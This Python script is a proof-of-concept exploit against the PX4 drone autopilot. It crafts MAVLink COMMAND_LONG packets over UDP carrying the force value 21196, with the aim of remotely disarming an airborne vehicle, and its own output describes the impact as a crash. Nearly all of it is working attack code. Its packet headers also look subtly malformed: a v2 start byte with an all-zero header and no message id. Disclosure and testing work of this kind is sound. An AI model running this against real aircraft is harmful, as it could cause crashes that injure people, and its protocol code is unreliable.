#!/usr/bin/env python3
"""
PX4 Force Flag 21196 Remote Exploitation PoC
  1. Force DISARM: disarm(reason, forced=true) 
  2. Force ARM:   arm(reason, from_external || !forced)
usage:
  python3 force_flag_poc.py --port 18570 [--target 1] [--scenario disarm|arm|both]
"""

import argparse
import struct
import socket
import sys
import time
from enum import IntEnum

# --- MAVLink Protocol Constants ---
MAVLINK_STX = 0xFD
MAVLINK_V1_HEADER_LEN = 10
MAVLINK_CRC_EXTRA = {
    76: 152,  # COMMAND_LONG
    0:  50,   # HEARTBEAT
    1:  124,  # SYS_STATUS
}

MAV_CMD_COMPONENT_ARM_DISARM = 400

MAV_STATE_BOOT = 0
MAV_STATE_ACTIVE = 4
MAV_TYPE_QUADROTOR = 2
MAV_AUTOPILOT_PX4 = 12

class VEHICLE_CMD_RESULT(IntEnum):
    ACCEPTED = 0
    TEMPORARILY_REJECTED = 1
    DENIED = 2

# --- CRC (x25) ---
def crc_accumulate(buf, crc=0xFFFF):
    for b in buf:
        tmp = b ^ (crc & 0xFF)
        tmp = (tmp ^ (tmp << 4)) & 0xFF
        crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    return crc

def mavlink_crc(msg_id, payload, extra_crc):
    crc = crc_accumulate(payload)
    crc = crc_accumulate(bytes([extra_crc]), crc)
    return crc

# --- MAVLink Pack/Unpack ---
def pack_command_long(target_system, target_component, command, confirmation,
                      param1, param2, param3, param4, param5, param6, param7):
    """Pack MAV_CMD_COMMAND_LONG (#76)"""
    payload = struct.pack('<fffffffHHBB',
        param1, param2, param3, param4,
        param5, param6, param7,
        command, target_system, target_component, confirmation)
    msgid = 76
    msg_len = len(payload)
    header = bytes([MAVLINK_STX, msg_len, 0, 0, 0, 0, 0, 0, 0, 0])  # sysid=0,compid=0,seq=0
    crc = mavlink_crc(msgid, payload, MAVLINK_CRC_EXTRA[msgid])
    return header + payload + struct.pack('<H', crc)

def pack_heartbeat(typ, autopilot, base_mode, custom_mode, system_status):
    """Pack HEARTBEAT (#0)"""
    payload = struct.pack('<IBBBBBB',
        custom_mode, typ, autopilot,
        base_mode, system_status, 0, 0)  # MAVLink version 0
    msgid = 0
    header = bytes([MAVLINK_STX, len(payload), 0, 0, 0, 0, 0, 0, 0, 0])
    crc = mavlink_crc(msgid, payload, MAVLINK_CRC_EXTRA[msgid])
    return header + payload + struct.pack('<H', crc)

def parse_msg(data):
    """Parse a MAVLink v1 message, return (msgid, sysid, compid, payload) or None"""
    if len(data) < MAVLINK_V1_HEADER_LEN + 2:
        return None
    if data[0] != MAVLINK_STX:
        return None
    payload_len = data[1]
    total_len = MAVLINK_V1_HEADER_LEN + payload_len + 2
    if len(data) < total_len:
        return None
    msgid = data[5]
    sysid = data[3]
    compid = data[4]
    payload = data[MAVLINK_V1_HEADER_LEN:MAVLINK_V1_HEADER_LEN+payload_len]
    return (msgid, sysid, compid, payload)

def parse_heartbeat(payload):
    return struct.unpack('<IBBBBBB', payload[:9])

def parse_command_ack(payload):
    """COMMAND_ACK (#77): command, result, progress, result_param2, target_system, target_component"""
    return struct.unpack('<HBBBBH', payload[:8])

# --- PoC Scenarios ---

class ForceFlagPoC:
    def __init__(self, host='127.0.0.1', port=18570, target_system=1, target_component=1):
        self.host = host
        self.port = port
        self.target_system = target_system
        self.target_component = target_component
        self.sock = None
        self.seq = 0
        self.vehicle_armed = False
        self.vehicle_mode = 0
        self.vehicle_state = 0

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(3.0)
        print(f"[+] Connected to {self.host}:{self.port} (UDP)")

    def send_cmd(self, command, param1=0.0, param2=0.0, param3=0.0, param4=0.0,
                 param5=0.0, param6=0.0, param7=0.0, confirmation=0):
        msg = pack_command_long(
            self.target_system, self.target_component, command, confirmation,
            param1, param2, param3, param4, param5, param6, param7)
        # Update sequence in header
        msg = msg[:2] + bytes([self.seq]) + msg[3:]
        self.seq = (self.seq + 1) % 256
        self.sock.sendto(msg, (self.host, self.port))
        return msg

    def recv_msgs(self, timeout=2.0):
        """Receive all pending messages, return list of (msgid, payload)"""
        msgs = []
        deadline = time.time() + timeout
        self.sock.settimeout(0.5)
        while time.time() < deadline:
            try:
                data, _ = self.sock.recvfrom(4096)
                parsed = parse_msg(data)
                if parsed:
                    msgs.append(parsed)
            except socket.timeout:
                break
        return msgs

    def detect_vehicle_state(self):
        """Get current vehicle armed/mode state"""
        msgs = self.recv_msgs(timeout=2.0)
        for msgid, sysid, compid, payload in msgs:
            if msgid == 0:  # HEARTBEAT
                _, typ, autopilot, base_mode, status, _, _ = parse_heartbeat(payload)
                self.vehicle_armed = bool(base_mode & 0x80)
                self.vehicle_state = status
                return self.vehicle_armed
        return None

    def scenario_force_disarm_inflight(self):
        """
        🔴 SCENARIO 1: Remote Force Disarm In-Flight
        Attack vector: MAVLink COMMAND_LONG(400) + param1=0(DISARM) + param2=21196(FORCE)
        Expected: Vehicle disarms even when airborne
        Source code: Commander.cpp:1044 → disarm(reason, forced=true) → bypasses landed check at line 703
        """
        print("\n" + "="*70)
        print("🔴 SCENARIO 1: Remote Force Disarm (In-Flight)")
        print("="*70)

        state = self.detect_vehicle_state()
        print(f"[*] Vehicle armed: {state}, mode state: {self.vehicle_state}")

        if not state:
            print("[!] Vehicle is NOT armed. Arming first (normal arm)...")
            self.send_cmd(MAV_CMD_COMPONENT_ARM_DISARM, param1=1.0)  # ARM without force
            time.sleep(1.0)
            self.detect_vehicle_state()
            time.sleep(2.0)

        if not self.vehicle_armed:
            print("[!] Could not arm vehicle. Cannot test force disarm.")
            print("    Try:  commander arm    (in SITL shell)")
            return False

        print(f"[*] Vehicle is armed. Attempting FORCE DISARM...")
        self.send_cmd(MAV_CMD_COMPONENT_ARM_DISARM, param1=0.0, param2=21196.0)
        time.sleep(1.0)

        msgs = self.recv_msgs(timeout=2.0)
        result = "UNKNOWN"
        for msgid, sysid, compid, payload in msgs:
            if msgid == 77:  # COMMAND_ACK
                cmd, res, _, _, _, _ = parse_command_ack(payload)
                if cmd == MAV_CMD_COMPONENT_ARM_DISARM:
                    result = VEHICLE_CMD_RESULT(res).name
                    print(f"[*] COMMAND_ACK: {result}")

        new_state = self.detect_vehicle_state()
        if new_state is False and self.vehicle_armed:
            print("[+] 🔴 EXPLOIT SUCCESS: Vehicle disarmed while airborne!")
            print("    Attack: MAVLink UDP → COMMAND_LONG(400, 0.0, 21196.0)")
            print("    Impact: Remote in-flight disarm → crash")
            return True
        elif new_state is True:
            print(f"[-] Vehicle still armed. Force disarm may be blocked.")
            print(f"    Result: {result}")
            return False
        else:
            print(f"[?] Cannot determine vehicle state. Result: {result}")
            return None

    def scenario_force_arm_unhealthy(self):
        """
        🟢 SCENARIO 2: Force Arm from External (MAVLink)
        Attack vector: MAVLink COMMAND_LONG(400) + param1=1(ARM) + param2=21196(FORCE)
        Expected: ARM is DENIED because from_external=true → run_preflight_checks=true
        Source code: Commander.cpp:1041 → arm(reason, from_external || !forced) = TRUE
        """
        print("\n" + "="*70)
        print("🟢 SCENARIO 2: Force Arm from External MAVLink")
        print("="*70)

        state = self.detect_vehicle_state()
        print(f"[*] Vehicle armed: {state}")

        if state:
            print("[*] Vehicle already armed. Disarming first with force...")
            self.send_cmd(MAV_CMD_COMPONENT_ARM_DISARM, param1=0.0, param2=21196.0)
            time.sleep(1.0)
            self.detect_vehicle_state()

        if self.vehicle_armed:
            print("[!] Could not disarm. Testing arm anyway...")

        print("[*] Attempting FORCE ARM from external MAVLink...")
        self.send_cmd(MAV_CMD_COMPONENT_ARM_DISARM, param1=1.0, param2=21196.0)
        time.sleep(1.5)

        msgs = self.recv_msgs(timeout=3.0)
        result = "UNKNOWN"
        ack_details = ""
        for msgid, sysid, compid, payload in msgs:
            if msgid == 77:  # COMMAND_ACK
                cmd, res, progress, rp2, _, _ = parse_command_ack(payload)
                if cmd == MAV_CMD_COMPONENT_ARM_DISARM:
                    result = VEHICLE_CMD_RESULT(res).name
                    ack_details = f"progress={progress}, result_param2={rp2}"
                    print(f"[*] COMMAND_ACK: {result} ({ack_details})")
            elif msgid == 0:
                _, _, _, base_mode, status, _, _ = parse_heartbeat(payload)
                self.vehicle_armed = bool(base_mode & 0x80)
                print(f"[*] HEARTBEAT: armed={self.vehicle_armed}, status={status}")

        new_state = self.vehicle_armed or self.detect_vehicle_state()
        if new_state:
            if result == "ACCEPTED":
                print("[!] ⚠️ UNEXPECTED: Force arm from external ACCEPTED")
                print("    This would indicate a bypass of health checks!")
                print("    DOUBLE-CHECK: was SITL in healthy state?")
            else:
                print("[+] Expected: Vehicle armed (normal state, SITL healthy)")
            return "accepted"
        else:
            print(f"[+] 🟢 DEFENSE WORKS: Force arm from external {result}")
            print("    Code logic: from_external || !forced = true → preflight checks run")
            print("    Fix needed only for Force DISARM, not Force ARM")
            return "denied"

    def scenario_force_arm_cli_comparison(self):
        """
        Compare: Internal CLI force arm vs External MAVLink force arm
        Demonstrates the from_external flag's protection mechanism
        """
        print("\n" + "="*70)
        print("📊 SCENARIO 3: Internal vs External Force Arm Comparison")
        print("="*70)
        print("""
        Code logic analysis:
          Internal (CLI): arm(reason=command_internal, from_external=false || !forced=true)
                        = arm(reason, false)  → run_preflight_checks=false
                        → ALL checks bypassed ✓

          External (MAVLink): arm(reason=command_external, from_external=true || !forced=true)
                            = arm(reason, true)  → run_preflight_checks=true
                            → Health checks RUN ✓

        This means PX4 correctly applies the principle:
          "Trust internal sources, verify external sources"
        BUT: For DISARM, the force flag is passed directly without the
             from_external protection. This is the vulnerability.
        """)

    def run_all(self):
        self.connect()
        try:
            self.scenario_force_arm_cli_comparison()
            result1 = self.scenario_force_arm_unhealthy()
            result2 = self.scenario_force_disarm_inflight()
            return result1 == "denied" and result2
        finally:
            if self.sock:
                self.sock.close()


def main():
    parser = argparse.ArgumentParser(
        description='PX4 Force Flag 21196 Remote Exploitation PoC')
    parser.add_argument('--host', default='127.0.0.1', help='SITL host')
    parser.add_argument('--port', type=int, default=18570, help='MAVLink UDP port')
    parser.add_argument('--target', type=int, default=1, help='Target system ID')
    parser.add_argument('--scenario', choices=['disarm', 'arm', 'both', 'compare'],
                        default='both', help='Test scenario')
    args = parser.parse_args()

    poc = ForceFlagPoC(args.host, args.port, args.target)

    if args.scenario == 'disarm':
        poc.connect()
        poc.scenario_force_disarm_inflight()
    elif args.scenario == 'arm':
        poc.connect()
        poc.scenario_force_arm_unhealthy()
    elif args.scenario == 'compare':
        poc.connect()
        poc.scenario_force_arm_cli_comparison()
    else:
        poc.run_all()


if __name__ == '__main__':
    main()
